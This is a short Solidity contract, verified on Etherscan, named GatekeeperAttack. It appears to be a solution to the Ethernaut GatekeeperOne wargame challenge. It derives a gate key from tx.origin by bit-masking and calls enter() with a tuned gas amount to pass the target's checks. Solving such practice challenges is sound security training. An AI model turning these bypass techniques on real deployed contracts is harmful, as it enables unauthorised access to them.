/**
 *Submitted for verification at Etherscan.io on 2023-02-24
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface IGatekeeperOne {

  function enter(bytes8 _gateKey) external returns(bool);

}

contract GatekeeperAttack {

    function attack(address keeper) public {
        bytes8 key = bytes8(
            uint64(uint16(uint160(tx.origin))) | (1 << 63)
        );
        IGatekeeperOne(keeper).enter{gas: 82181}(key);
    }

}